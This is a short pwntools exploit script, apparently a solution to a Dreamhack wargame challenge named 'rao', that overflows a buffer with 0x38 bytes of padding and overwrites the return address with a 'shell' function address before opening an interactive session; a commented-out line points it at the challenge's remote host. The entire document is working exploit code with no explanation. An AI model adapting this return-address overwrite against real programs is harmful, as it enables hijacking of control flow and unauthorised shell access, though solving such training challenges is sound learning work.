from pwn import *

p = process('./rao')
#p = remote('host3.dreamhack.games', '15293')

shell = 0x4006aa

payload = b"A"*0x38 + p64(shell)

p.send(payload)

p.interactive()